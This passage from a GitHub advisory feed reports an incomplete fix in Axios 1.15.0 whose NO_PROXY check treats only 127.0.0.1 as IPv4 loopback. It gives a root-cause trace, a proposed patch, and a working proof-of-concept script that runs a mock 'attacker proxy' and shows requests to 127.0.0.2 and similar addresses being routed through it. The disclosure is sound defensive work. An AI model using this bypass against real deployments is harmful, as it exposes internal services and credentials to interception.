Condition 2:  Has HTTP_PROXY or HTTPS_PROXY set in its environment
              (common in corporate networks, cloud deployments,
               containerised environments, and CI/CD pipelines)
Condition 3:  Relies on NO_PROXY=localhost,127.0.0.1,::1 (or similar)
              to protect loopback or internal services from proxy routing
</code></pre>
<p><strong>Affected Deployment Environments</strong></p>
<table>
<thead>
<tr>
<th>Environment</th>
<th>Risk Level</th>
</tr>
</thead>
<tbody><tr>
<td>Cloud-hosted applications (AWS, GCP, Azure)</td>
<td>Critical</td>
</tr>
<tr>
<td>Containerised microservices (Docker, Kubernetes)</td>
<td>Critical</td>
</tr>
<tr>
<td>Corporate networks with mandatory proxy</td>
<td>High</td>
</tr>
<tr>
<td>CI/CD pipelines with proxy environment variables</td>
<td>High</td>
</tr>
<tr>
<td>On-premise servers with internal proxy</td>
<td>High</td>
</tr>
</tbody></table>
<p><strong>Scale of Exposure</strong>
Axios is one of the most widely used HTTP client libraries in the JavaScript ecosystem, with over <strong>500 million weekly downloads</strong> on npm. Any application in the above categories using Axios 1.15.0 is affected, regardless of whether the developer is aware of the underlying proxy routing logic.</p>
<p><strong>4.3 Impact Details</strong></p>
<p><strong>Impact 1 Silent Interception of Internal Service Traffic</strong></p>
<p>When an application makes a request to an internal loopback service using a non-standard loopback address (e.g., <code>http://127.0.0.2/admin</code>), Axios silently routes the request through the configured proxy instead of connecting directly.</p>
<pre><code>Developer expects:    Application → 127.0.0.2:8080 (direct)
Actual behaviour:     Application → Attacker Proxy → 127.0.0.2:8080
The proxy receives:
  - Full request URL
  - HTTP method
  - All request headers (including Authorization, Cookie, API keys)
  - Request body (for POST/PUT requests)
  - Full response from the internal service
</code></pre>
<p>The developer receives no error or warning. From the application's perspective, the request succeeds normally.</p>
<p><strong>Impact 2 — SSRF Mitigation Bypass</strong>
Many applications implement SSRF protections by configuring <code>NO_PROXY</code> to prevent requests to loopback addresses from being forwarded externally. This bypass defeats that protection entirely for any loopback address beyond <code>127.0.0.1</code>.</p>
<pre><code>SSRF Protection (as configured by developer):
  NO_PROXY = localhost,127.0.0.1,::1
What developer believes is protected:
  All loopback/internal addresses
What is actually protected:
  Only: localhost, 127.0.0.1, ::1 (3 of 16,777,216 loopback addresses)
What remains exposed:
  127.0.0.2 through 127.255.255.254 (16,777,213 addresses)
</code></pre>
<p>An attacker who can influence the target URL of an Axios request through user-supplied input, redirect chains, or other SSRF vectors can exploit this gap to reach internal services that the developer explicitly intended to protect.</p>
<p><strong>Impact 3 — Cloud Metadata Service Exposure</strong>
In cloud environments (AWS, GCP, Azure), SSRF vulnerabilities are particularly severe because they can be used to access the instance metadata service and retrieve IAM credentials, enabling full cloud account compromise.</p>
<p>While the AWS IMDSv2 service is reachable at <code>169.254.169.254</code> (not a loopback address), many cloud deployments run internal metadata proxies, credential servers, or service discovery endpoints bound to non-standard loopback addresses within the <code>127.0.0.0/8</code> range. An attacker reaching any of these services through the bypass could:</p>
<ul>
<li>Retrieve temporary IAM credentials</li>
<li>Access environment variables containing secrets</li>
<li>Enumerate internal service configurations</li>
<li>Pivot to other internal services via the compromised credentials</li>
</ul>
<p><strong>Impact 4 — Confidential Data Exfiltration</strong>
Any internal service binding to a <code>127.x.x.x</code> address other than <code>127.0.0.1</code> is fully exposed. This includes:</p>
<table>
<thead>
<tr>
<th>Internal Service Type</th>
<th>Exposed Data</th>
</tr>
</thead>
<tbody><tr>
<td>Admin panels / dashboards</td>
<td>User data, configuration, logs</td>
</tr>
<tr>
<td>Internal APIs</td>
<td>Business logic, database contents</td>
</tr>
<tr>
<td>Secret managers / vaults</td>
<td>API keys, tokens, certificates</td>
</tr>
<tr>
<td>Health check endpoints</td>
<td>Infrastructure topology</td>
</tr>
<tr>
<td>Development services</td>
<td>Source code, environment variables</td>
</tr>
</tbody></table>
<p><strong>Impact 5 — No Indication of Compromise</strong>
A particularly dangerous characteristic of this vulnerability is that it is <strong>completely silent</strong> neither the application nor the developer receives any indication that requests are being routed incorrectly. There are no error messages, no exceptions thrown, and no changes in application behaviour. The proxy interception is entirely transparent from the application's perspective, making detection extremely difficult without active network monitoring.</p>
<p><strong>4.4 Comparison with Original Vulnerability</strong></p>
<table>
<thead>
<tr>
<th>Internal Service Type</th>
<th>Exposed Data</th>
<th>Exposed Data</th>
</tr>
</thead>
<tbody><tr>
<td>Attack method</td>
<td>Use localhost. or [::1]</td>
<td>Use any 127.x.x.x ≠ 127.0.0.1</td>
</tr>
<tr>
<td>Patch status</td>
<td>Fixed in 1.15.0</td>
<td>Not fixed in 1.15.0</td>
</tr>
<tr>
<td>CVSS score</td>
<td>9.3 Critical</td>
<td>9.9 Critical or (equivalent)</td>
</tr>
<tr>
<td>Attacker effort</td>
<td>Trivial</td>
<td>Trivial</td>
</tr>
<tr>
<td>Detection by developer</td>
<td>None</td>
<td>None</td>
</tr>
<tr>
<td>Impact</td>
<td>SSRF / proxy bypass</td>
<td>SSRF / proxy bypass (identical)</td>
</tr>
</tbody></table>
<p>The severity of this finding is equivalent to the original vulnerability because the attack conditions, exploitation technique, and resulting impact are identical. The only difference is the specific input used to trigger the bypass, which the existing patch completely fails to address.</p>
<p><strong>5. Technical Remediation &amp; Proposed Fix</strong></p>
<p><strong>5.1 Vulnerable Code Block</strong></p>
<p>The vulnerability resides in <code>lib/helpers/shouldBypassProxy.js</code> at lines 1–3. The following is the exact code extracted from Axios 1.15.0:</p>
<pre><code>// lib/helpers/shouldBypassProxy.js — Axios 1.15.0
// Lines 1–3 (VULNERABLE)
const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
const isLoopback = (host) =&gt; LOOPBACK_ADDRESSES.has(host);
</code></pre>
<p>This hardcoded <code>Set</code> is subsequently used at line 108 during the final NO_PROXY match evaluation:</p>
<pre><code>// lib/helpers/shouldBypassProxy.js — Line 108 (VULNERABLE USAGE)
return hostname === entryHost || (isLoopback(hostname) &amp;&amp; isLoopback(entryHost));
//                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
// isLoopback("127.0.0.2") → LOOPBACK_ADDRESSES.has("127.0.0.2") → FALSE
// This causes the match to fail for any 127.x.x.x address beyond 127.0.0.1
</code></pre>
<p><strong>Why this is dangerous:</strong> The <code>Set</code> performs a strict membership check. Any IPv4 loopback address outside the three hardcoded entries returns <code>false</code>, causing <code>shouldBypassProxy()</code> to return <code>false</code> and silently route the request through the configured proxy.</p>
<p><strong>5.2 Proposed Patched Code</strong>
Replace lines 1–3 in <code>lib/helpers/shouldBypassProxy.js</code> with the following RFC-compliant implementation:</p>
<pre><code>// lib/helpers/shouldBypassProxy.js
// Lines 1–3 (PROPOSED FIX — RFC 1122 §3.2.1.3 Compliant)
const isLoopback = (host) =&gt; {
  // Named loopback hostname
  if (host === 'localhost') return true;
  // IPv6 loopback address
  if (host === '::1') return true;
  // Full IPv4 loopback subnet: 127.0.0.0/8 (RFC 1122 §3.2.1.3)
  // Matches any address from 127.0.0.0 through 127.255.255.254
  const parts = host.split('.');
  return (
    parts.length === 4 &amp;&amp;
    parts[0] === '127' &amp;&amp;
    parts.every((p) =&gt; /^\d+$/.test(p) &amp;&amp; Number(p) &gt;= 0 &amp;&amp; Number(p) &lt;= 255)
  );
};
</code></pre>
<p><strong>5.3 Diff View — Before vs After</strong></p>
<pre><code>// lib/helpers/shouldBypassProxy.js
- const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
-
- const isLoopback = (host) =&gt; LOOPBACK_ADDRESSES.has(host);
+ const isLoopback = (host) =&gt; {
+   if (host === 'localhost') return true;
+   if (host === '::1') return true;
+   const parts = host.split('.');
+   return (
+     parts.length === 4 &amp;&amp;
+     parts[0] === '127' &amp;&amp;
+     parts.every((p) =&gt; /^\d+$/.test(p) &amp;&amp; Number(p) &gt;= 0 &amp;&amp; Number(p) &lt;= 255)
+   );
+ };
</code></pre>
<p>All other code in <code>shouldBypassProxy.js</code> remains unchanged. No other files require modification.</p>
<p><strong>5.4 Why This Fix Must Be Applied</strong></p>
<p><strong>Reason 1 — RFC 1122 Compliance</strong></p>
<p>The current implementation violates <strong>RFC 1122 §3.2.1.3</strong>, which defines the entire <code>127.0.0.0/8</code> block as the IPv4 loopback address range not just the single address <code>127.0.0.1</code>. The proposed fix aligns Axios with the standard, ensuring that all valid loopback addresses are recognised and handled consistently.</p>
<pre><code>RFC 1122 §3.2.1.3:
"The address 127.0.0.0/8 is assigned for loopback.
 A datagram sent by a higher-level protocol to a loopback
 address MUST NOT appear on any network."
Current fix covers  :  3 addresses (localhost, 127.0.0.1, ::1)
Proposed fix covers :  16,777,216 addresses (entire 127.0.0.0/8 + loopback names)
</code></pre>
<p><strong>Reason 2 — The Existing Patch Has Already Failed Once</strong></p>
<p>The patch for GHSA-3p68-rc4w-qgx5 was released with the explicit intent of securing NO_PROXY hostname matching for loopback addresses. Within the same release (1.15.0), the protection can be bypassed by substituting <code>127.0.0.1</code> with any other address in the <code>127.0.0.0/8</code> range. Leaving this gap unaddressed means that the patch creates a <strong>false sense of security</strong> developers believe their loopback traffic is protected when it is not.</p>
<p><strong>Reason 3 — Real Operating System Behaviour</strong>
On Linux the dominant platform for Node.js server deployments the kernel routes the <strong>entire <code>127.0.0.0/8</code> subnet</strong> to the loopback interface <code>lo</code> by default. This means any address in that range functions identically to <code>127.0.0.1</code> at the networking level.</p>
<pre><code># Linux routing table — default configuration
$ ip route show table local | grep "127"
local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1
# Proof: 127.0.0.2 is a valid loopback address on Linux
$ ping -c 1 127.0.0.2
PING 127.0.0.2: 56 data bytes
64 bytes from 127.0.0.2: icmp_seq=0 ttl=64 time=0.045 ms
</code></pre>
<img width="711" height="181" alt="04_linux_loopback_subnet_proof" src="https://github.com/user-attachments/assets/fd0f8430-37c5-4597-b2d9-8e27e479d7b2">

<p>Axios's current implementation does not reflect this operating system behaviour, resulting in an inconsistency between what the OS considers loopback and what Axios treats as loopback.</p>
<img width="588" height="198" alt="06_ping_127 0 0 2_loopback_confirmed" src="https://github.com/user-attachments/assets/23bf1ab8-1bd6-4f39-88a7-93c518d72990">

<p><strong>Reason 4 — The Proposed Fix Has Zero Performance Impact</strong>
The existing solution uses a <code>Set.has()</code> lookup an O(1) operation. The proposed fix replaces this with:</p>
<ol>
<li>Two direct string comparisons (<code>'localhost'</code>, <code>'::1'</code>) — O(1)</li>
<li>A <code>split('.')</code> and array validation — O(1) with a fixed-length array of 4 elements
The computational cost is <strong>equivalent or lower</strong> than the current approach, and the fix introduces no new external dependencies.</li>
</ol>
<p><strong>Reason 5 — The Fix Is Minimal and Surgical</strong>
The proposed change modifies only <strong>3 lines</strong> of a single file. It does not alter:</p>
<ul>
<li>The <code>parseNoProxyEntry()</code> function</li>
<li>The <code>normalizeNoProxyHost()</code> function</li>
<li>The <code>shouldBypassProxy()</code> main function logic</li>
<li>Any other file in the codebase</li>
</ul>
<p>This minimises regression risk and makes the fix straightforward to review, test, and backport to older supported branches.</p>
<p><strong>Reason 6 — Resilient to Alternative IP Encodings</strong>
Because Axios normalises the request URL using Node's native <code>new URL()</code> parser before passing it to <code>shouldBypassProxy()</code>, alternative IP encodings (such as octal <code>0177.0.0.1</code>, hex <code>0x7f.0.0.1</code>, or integer <code>2130706433</code>) are already resolved into their standard IPv4 dotted-decimal format. This means the proposed <code>.split('.')</code> validation logic is completely robust and cannot be bypassed using URL-encoded IP obfuscation techniques.</p>
<p><strong>5.5 Additional Recommendation — IPv6 Loopback Range</strong></p>
<p>While the primary bypass demonstrated in this report targets the IPv4 <code>127.0.0.0/8</code> range, the Axios team should also consider validating the full IPv6 loopback representation. The current implementation recognises only <code>::1</code>. A more complete check would also handle the full-form notation:</p>
<pre><code>// Additional IPv6 loopback representations to consider:
'0:0:0:0:0:0:0:1'      // Full notation of ::1
'::ffff:127.0.0.1'     // IPv4-mapped IPv6 loopback
'::ffff:7f00:1'        // Hex IPv4-mapped IPv6 loopback
</code></pre>
<p>Normalising these representations before comparison would make the NO_PROXY implementation comprehensively RFC-compliant across both IPv4 and IPv6 address families.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-pmwg-cvhr-8vh7">https://github.com/axios/axios/security/advisories/GHSA-pmwg-cvhr-8vh7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42043">https://nvd.nist.gov/vuln/detail/CVE-2026-42043</a></li>
<li><a href="https://github.com/advisories/GHSA-pmwg-cvhr-8vh7">https://github.com/advisories/GHSA-pmwg-cvhr-8vh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmwg-cvhr-8vh7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T00:20:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: Incomplete Fix for CVE-2025-62718 — NO_PROXY Protection Bypassed via RFC 1122 Loopback Subnet (127.0.0.0/8) in Axios 1.15.0]]></title>
        <id>https://github.com/advisories/GHSA-pmwg-cvhr-8vh7</id>
        <link href="https://github.com/advisories/GHSA-pmwg-cvhr-8vh7"/>
        <updated>2026-05-05T00:20:58.000Z</updated>
        <content type="html"><![CDATA[<p><strong>1. Executive Summary</strong>
This report documents an <strong>incomplete security patch</strong> for the previously disclosed vulnerability <strong>GHSA-3p68-rc4w-qgx5 (CVE-2025-62718)</strong>, which affects the <code>NO_PROXY</code> hostname resolution logic in the Axios HTTP library.</p>
<p><strong>Background — The Original Vulnerability</strong>
The original vulnerability (GHSA-3p68-rc4w-qgx5) disclosed that Axios did not normalize hostnames before comparing them against <code>NO_PROXY</code> rules. Specifically, a request to <code>http://localhost./</code> (with a trailing dot) or <code>http://[::1]/</code> (with IPv6 bracket notation) would <strong>bypass NO_PROXY matching entirely</strong> and be forwarded to the configured HTTP proxy — even when <code>NO_PROXY=localhost,127.0.0.1,::1</code> was explicitly set by the developer to protect loopback services.</p>
<p>The Axios maintainers addressed this in <strong>version 1.15.0</strong> by introducing a <code>normalizeNoProxyHost()</code> function in <code>lib/helpers/shouldBypassProxy.js</code>, which strips trailing dots from hostnames and removes brackets from IPv6 literals before performing the NO_PROXY comparison.</p>
<p><strong>The Incomplete Patch — This Finding</strong>
While the patch correctly addresses the specific cases reported (trailing dot normalization and IPv6 bracket removal), <strong>the fix is architecturally incomplete</strong>.</p>
<p>The patch introduced a hardcoded set of recognized loopback addresses:</p>
<pre><code>// lib/helpers/shouldBypassProxy.js — Line 1
const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
</code></pre>
<p>However, <strong>RFC 1122 §3.2.1.3</strong> explicitly defines the <strong>entire 127.0.0.0/8 subnet</strong> as the IPv4 loopback address block not just the single address <code>127.0.0.1</code>. On all major operating systems (Linux, macOS, Windows with WSL), any IP address in the range <code>127.0.0.2</code> through <code>127.255.255.254</code> is a valid, functional loopback address that routes to the local machine.</p>
<p>As a result, an attacker who can influence the target URL of an Axios request can substitute 127.0.0.1 with any other address in the <code>127.0.0.0/8</code> range (e.g., <code>127.0.0.2</code>, <code>127.0.0.100</code>, <code>127.1.2.3</code>) to <strong>completely bypass</strong> the <code>NO_PROXY</code> protection even in the fully patched Axios 1.15.0 release.</p>
<p><strong>Verification</strong>
This bypass has been <strong>independently verified</strong> on:</p>
<ul>
<li><strong>Axios version:</strong> 1.15.0 (latest patched release)</li>
<li><strong>Node.js version:</strong> v22.16.0</li>
<li><strong>OS:</strong> Kali Linux (rolling)</li>
</ul>
<p>The Proof-of-Concept demonstrates that while <code>localhost</code>, <code>localhost</code>., and <code>[::1]</code> are correctly blocked by the patched version, requests to <code>127.0.0.2</code>, <code>127.0.0.100</code>, and <code>127.1.2.3</code> are <strong>transparently forwarded to the attacker-controlled proxy server</strong>, confirming that the patch does not cover the full RFC-defined loopback address space.</p>
<p><strong>2. Deep-Dive: Technical Root Cause Analysis</strong>
<strong>2.1 Vulnerable File &amp; Location</strong></p>
<table>
<thead>
<tr>
<th>Field</th>
<th>Detail</th>
</tr>
</thead>
<tbody><tr>
<td>File</td>
<td>lib/helpers/shouldBypassProxy.js</td>
</tr>
<tr>
<td>Primary Flaw</td>
<td>isLoopback() — Line 1–3</td>
</tr>
<tr>
<td>Supporting Function</td>
<td>shouldBypassProxy() — Line 59–110</td>
</tr>
<tr>
<td>Axios Version</td>
<td>1.15.0 (Latest Patched Release)</td>
</tr>
</tbody></table>
<p><strong>2.2 How Axios Routes HTTP Requests  The Call Chain</strong>
When Axios dispatches any HTTP request, <code>lib/adapters/http.js</code> calls <code>setProxy()</code>, which invokes <code>shouldBypassProxy()</code> to decide whether to honour a configured proxy:</p>
<pre><code>// lib/adapters/http.js — Lines 191–199
function setProxy(options, configProxy, location) {
  let proxy = configProxy;
  if (!proxy &amp;&amp; proxy !== false) {
    const proxyUrl = getProxyForUrl(location);   // Step 1: Read proxy env var
    if (proxyUrl) {
      if (!shouldBypassProxy(location)) {         // Step 2: Check NO_PROXY
        proxy = new URL(proxyUrl);               // Step 3: Assign proxy
      }
    }
  }
}
</code></pre>
<p><code>shouldBypassProxy()</code> is the <strong>single gatekeeper</strong> for NO_PROXY enforcement. A bypass here means all proxy protection fails silently.</p>
<p><strong>2.3 The Original Vulnerability (GHSA-3p68-rc4w-qgx5)</strong>
Before Axios 1.15.0, hostnames were compared against <code>NO_PROXY</code> using a <strong>raw literal string match</strong> with no normalization:</p>
<pre><code>Request URL → http://localhost./secret
NO_PROXY    → "localhost,127.0.0.1,::1"
Comparison:
  "localhost." === "localhost"   →  FALSE  →  Proxy used  ← BYPASS
  "[::1]"     === "::1"         →  FALSE  →  Proxy used  ← BYPASS
</code></pre>
<p>Both <code>localhost.</code> (FQDN trailing dot, RFC 1034 §3.1) and <code>[::1]</code> (bracketed IPv6 literal, RFC 3986 §3.2.2) are <strong>canonical representations of loopback addresses</strong>, but Axios treated them as unknown hosts.</p>
<p><strong>2.4 What the Patch Fixed (Axios 1.15.0)</strong>
The patch introduced three changes inside <code>lib/helpers/shouldBypassProxy.js</code>:</p>
<img width="602" height="123" alt="01_axios_version_verification" src="https://github.com/user-attachments/assets/844446f2-01fb-4933-9316-fb849c40c8f5">

<p><strong>Fix A <code>normalizeNoProxyHost()</code> (Lines 47–57)</strong>
Strips alternate representations before comparison:</p>
<pre><code>const normalizeNoProxyHost = (hostname) =&gt; {
  if (!hostname) return hostname;
  // Remove IPv6 brackets: "[::1]" → "::1"
  if (hostname.charAt(0) === '[' &amp;&amp; hostname.charAt(hostname.length - 1) === ']') {
    hostname = hostname.slice(1, -1);
  }
  // Strip trailing FQDN dot: "localhost." → "localhost"
  return hostname.replace(/\.+$/, '');
};
</code></pre>
<p><strong>Fix B Cross-Loopback Equivalence (Lines 1–3 &amp; 108)</strong>
Allows <code>127.0.0.1</code> and <code>localhost</code> to match each other interchangeably:</p>
<pre><code>const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
const isLoopback = (host) =&gt; LOOPBACK_ADDRESSES.has(host);
// Line 108 — Final match condition:
return hostname === entryHost
    || (isLoopback(hostname) &amp;&amp; isLoopback(entryHost));
//      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
//      If both sides are "loopback" → treat as match
</code></pre>
<p><strong>Fix C Normalization Applied on Both Sides (Lines 81 &amp; 90)</strong></p>
<pre><code>// Request hostname normalized:
const hostname = normalizeNoProxyHost(parsed.hostname.toLowerCase());
// Each NO_PROXY entry normalized:
entryHost = normalizeNoProxyHost(entryHost);
</code></pre>
<p><strong>2.5 The Incomplete Patch Exact Root Cause</strong>
The fundamental flaw resides in Line 1:</p>
<pre><code>// lib/helpers/shouldBypassProxy.js — Line 1  ← ROOT CAUSE
const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
//                                              ^^^^^^^^^^^
//                              Only ONE IPv4 loopback address is recognized.
//                              The entire 127.0.0.0/8 subnet is unaccounted for.
// Line 3 — Lookup against this incomplete set:
const isLoopback = (host) =&gt; LOOPBACK_ADDRESSES.has(host);
//                                               ^^^^^^^^^
//                          Returns FALSE for any 127.x.x.x ≠ 127.0.0.1
</code></pre>
<img width="884" height="135" alt="02_vulnerable_code_loopback_addresses" src="https://github.com/user-attachments/assets/ba06b91e-a2d2-4a99-9e1f-8c8bfbb6d71e">

<p>*<strong>RFC 1122 §3.2.1.3 is unambiguous:</strong></p>
<blockquote>
<p>"The address 127.0.0.0/8 is assigned for loopback. A datagram sent by a higher-level protocol to a loopback address MUST NOT appear on any network."</p>
</blockquote>
<p>This means all addresses from <code>127.0.0.1</code> through <code>127.255.255.254</code> are valid loopback addresses on any RFC-compliant operating system. On Linux, the entire <code>/8</code> block is routed to the <code>lo</code> interface by default. The patch recognises only <code>127.0.0.1</code>, leaving <code>16,777,213</code> valid loopback addresses unprotected.</p>
<img width="884" height="537" alt="03_rfc1122_loopback_definition" src="https://github.com/user-attachments/assets/951eabb4-2ec6-40ef-ad00-1fd5b9aed2d0">

<p><strong>2.6 Step-by-Step Bypass Execution Trace</strong>
Environment:</p>
<pre><code>NO_PROXY   = "localhost,127.0.0.1,::1"
HTTP_PROXY = "http://attacker-proxy:5300"
Target URL = "http://127.0.0.2:9191/internal-api"
</code></pre>
<p><strong>Annotated execution of shouldBypassProxy("<a href="http://127.0.0.2:9191/internal-api">http://127.0.0.2:9191/internal-api</a>"):</strong></p>
<pre><code>// Step 1 — Parse the request URL
parsed   = new URL("http://127.0.0.2:9191/internal-api")
hostname = "127.0.0.2"    // parsed.hostname
// Step 2 — Read NO_PROXY environment variable
noProxy  = "localhost,127.0.0.1,::1"   // lowercased
// Step 3 — Normalize the request hostname
hostname = normalizeNoProxyHost("127.0.0.2")
//          No brackets → skip
//          No trailing dot → skip
//          Result: "127.0.0.2"  (unchanged)
// Step 4 — Iterate over NO_PROXY entries
//  Entry → "localhost"
entryHost = "localhost"
"127.0.0.2" === "localhost"                  → false
isLoopback("127.0.0.2")                      → false  ← Set.has() returns false
                                                          BYPASS starts here
//  Entry → "127.0.0.1"
entryHost = "127.0.0.1"
"127.0.0.2" === "127.0.0.1"                 → false
isLoopback("127.0.0.2") &amp;&amp; isLoopback("127.0.0.1")
  → LOOPBACK_ADDRESSES.has("127.0.0.2")     → false  ← Same failure
  → false
//  Entry → "::1"
entryHost = "::1"
"127.0.0.2" === "::1"                        → false
isLoopback("127.0.0.2") &amp;&amp; isLoopback("::1")
  → LOOPBACK_ADDRESSES.has("127.0.0.2")     → false  ← Same failure
  → false
// Step 5 — Final return
shouldBypassProxy() → false
//  Axios proceeds to route the request through the configured proxy.
//  The attacker's proxy server receives the full request including headers
//  and any response from the internal service.
</code></pre>
<p><strong>2.7 Why the Patch Design Is Flawed</strong>
The patch addresses the <strong>symptom</strong> (two specific alternate representations) rather than the <strong>root cause</strong> (an incomplete definition of what constitutes a loopback address).</p>
<table>
<thead>
<tr>
<th>Aspect</th>
<th>Original Bug</th>
<th>This Finding</th>
</tr>
</thead>
<tbody><tr>
<td>What was wrong</td>
<td>No normalization before comparison</td>
<td>Incomplete loopback address set</td>
</tr>
<tr>
<td>Fix applied</td>
<td>Added normalizeNoProxyHost()</td>
<td>None set remains hardcoded</td>
</tr>
<tr>
<td>RFC compliance</td>
<td>Violated RFC 1034 &amp; RFC 3986</td>
<td>Violates RFC 1122 §3.2.1.3</td>
</tr>
<tr>
<td>Bypass method</td>
<td>Alternate string representation</td>
<td>Alternate valid loopback address</td>
</tr>
<tr>
<td>Impact</td>
<td>NO_PROXY bypass → SSRF</td>
<td>NO_PROXY bypass → SSRF (identical)</td>
</tr>
</tbody></table>
<pre><code>**2.8 Total Exposed Address Space**
Protected by patch:    127.0.0.1          (1 address)
Unprotected loopback:  127.0.0.2
                       through
                       127.255.255.254    (16,777,213 addresses)
</code></pre>
<p>Real-world services that commonly bind to non-standard loopback addresses include:</p>
<ul>
<li>Internal microservices and admin dashboards using dedicated loopback IPs</li>
<li>Development environments with multiple isolated service instances</li>
<li>Docker and container bridge network configurations</li>
<li>Test infrastructure allocating sequential loopback IPs across services</li>
</ul>
<p><strong>3. Comprehensive Attack Vector &amp; Proof of Concept</strong></p>
<p><strong>3.1 Reproduction Steps</strong></p>
<p>Step 1 — Create a fresh project directory</p>
<pre><code>mkdir axios-bypass-test &amp;&amp; cd axios-bypass-test
</code></pre>
<p><strong>Step 2 — Initialize the project with the patched Axios version</strong>
Create <code>package.json</code>:</p>
<pre><code>{
  "type": "module",
  "dependencies": {
    "axios": "1.15.0"
  }
}
</code></pre>
<p>Install dependencies:</p>
<pre><code>npm install
</code></pre>
<p>Verify the installed version:</p>
<pre><code>npm list axios
# Expected output: axios@1.15.0
</code></pre>
<p><strong>Step 3 — Create the PoC file (<code>poc.js</code>)</strong></p>
<pre><code>import http from 'http';
import axios from 'axios';
// ── Simulated attacker-controlled proxy server ────────────────────────────────
const PROXY_PORT = 5300;
http.createServer((req, res) =&gt; {
  console.log('\n[!] PROXY HIT — Attacker proxy received request!');
  console.log(`    Method : ${req.method}`);
  console.log(`    URL    : ${req.url}`);
  console.log(`    Host   : ${req.headers.host}`);
  res.writeHead(200);
  res.end('proxied');
}).listen(PROXY_PORT);
// ── Simulated developer security configuration ────────────────────────────────
// Developer believes all loopback traffic is protected by NO_PROXY.
process.env.HTTP_PROXY = `http://127.0.0.1:${PROXY_PORT}`;
process.env.NO_PROXY   = 'localhost,127.0.0.1,::1';
// ── Test helper ───────────────────────────────────────────────────────────────
async function test(url) {
  console.log(`\n[*] Testing: ${url}`);
  try {
    const res = await axios.get(url, { timeout: 2000 });
    if (res.data === 'proxied') {
      console.log('    Result → [PROXIED]  ← BYPASS CONFIRMED');
    } else {
      console.log('    Result → [DIRECT]   ← Safe, no proxy used');
    }
  } catch (err) {
    if (err.code === 'ECONNREFUSED') {
      console.log('    Result → [DIRECT]   ← ECONNREFUSED (request did not go through proxy)');
    }
  }
}
// ── Test execution ────────────────────────────────────────────────────────────
setTimeout(async () =&gt; {
  // Section A: Cases fixed by the existing patch — expected to go DIRECT
  console.log('\n=== PATCHED CASES (Expected: All requests bypass the proxy) ===');
  await test('http://localhost:9191/secret');
  await test('http://localhost.:9191/secret');
  await test('http://[::1]:9191/secret');
  // Section B: Bypass cases — expected to go DIRECT, but actually go through proxy
  console.log('\n=== BYPASS CASES (Expected: bypass proxy | Actual: routed through proxy) ===');
  await test('http://127.0.0.2:9191/secret');
  await test('http://127.0.0.100:9191/secret');
  await test('http://127.1.2.3:9191/secret');
  process.exit(0);
}, 500);
</code></pre>
<p><strong>Step 4 — Execute the PoC</strong></p>
<pre><code>node poc.js
</code></pre>
<p><strong>3.2 Observed Output</strong>
The following output was captured during testing on Kali Linux with Axios 1.15.0:</p>
<pre><code>=== PATCHED CASES (Expected: All requests bypass the proxy) ===
[*] Testing: http://localhost:9191/secret
    Result → [DIRECT]   ← ECONNREFUSED (request did not go through proxy)  
[*] Testing: http://localhost.:9191/secret
    Result → [DIRECT]   ← ECONNREFUSED (request did not go through proxy)  
[*] Testing: http://[::1]:9191/secret
    Result → [DIRECT]   ← ECONNREFUSED (request did not go through proxy)  
=== BYPASS CASES (Expected: bypass proxy | Actual: routed through proxy) ===
[*] Testing: http://127.0.0.2:9191/secret
[!] PROXY HIT — Attacker proxy received request!
    Method : GET
    URL    : http://127.0.0.2:9191/secret
    Host   : 127.0.0.2:9191
    Result → [PROXIED]  ← BYPASS CONFIRMED                                 
[*] Testing: http://127.0.0.100:9191/secret
[!] PROXY HIT — Attacker proxy received request!
    Method : GET
    URL    : http://127.0.0.100:9191/secret
    Host   : 127.0.0.100:9191
    Result → [PROXIED]  ← BYPASS CONFIRMED                                 
[*] Testing: http://127.1.2.3:9191/secret
[!] PROXY HIT — Attacker proxy received request!
    Method : GET
    URL    : http://127.1.2.3:9191/secret
    Host   : 127.1.2.3:9191
    Result → [PROXIED]  ← BYPASS CONFIRMED                                 
</code></pre>
<img width="1621" height="739" alt="05_poc_execution_bypass_confirmed" src="https://github.com/user-attachments/assets/6caf9f7a-36ed-4feb-b9f3-f82532da2de7">

<p><strong>3.3 Analysis of Results</strong>
The output conclusively demonstrates the following:</p>
<p><strong>Patched cases behave correctly:</strong> Requests to <code>localhost</code>, <code>localhost.</code> (trailing dot), and <code>[::1]</code> (bracketed IPv6) all result in a direct connection, confirming that the existing patch in Axios 1.15.0 correctly handles the cases reported in GHSA-3p68-rc4w-qgx5.</p>
<p><strong>Bypass cases confirm the incomplete patch:</strong> Requests to <code>127.0.0.2</code>, <code>127.0.0.100</code>, and <code>127.1.2.3</code> all of which are valid loopback addresses within the <code>127.0.0.0/8</code> subnet as defined by <code>RFC 1122 §3.2.1.3</code> are transparently forwarded to the attacker-controlled proxy server. The proxy receives the full request including the HTTP method, target URL, and <code>Host</code> header, demonstrating that any response from an internal service bound to these addresses would be fully intercepted.</p>
<p>This confirms that the <code>NO_PROXY</code> protection configured by the developer (<code>localhost,127.0.0.1,::1</code>) fails silently for the entire <code>127.0.0.0/8</code> address range beyond <code>127.0.0.1</code>, providing a reproducible and reliable bypass of the security control introduced by the patch.</p>
<p><strong>4. Impact Assessment</strong>
This vulnerability is a <strong>security control bypass</strong> specifically an incomplete patch that allows an attacker to circumvent the <code>NO_PROXY</code> protection mechanism in Axios by using any loopback addresses within the <code>127.0.0.0/8</code> subnet other than <code>127.0.0.1</code>. The result is that traffic intended to remain private and direct is silently intercepted by a configured proxy server.</p>
<p><strong>4.1 Who Is Impacted?</strong></p>
<p>Primary Target — Node.js Backend Applications
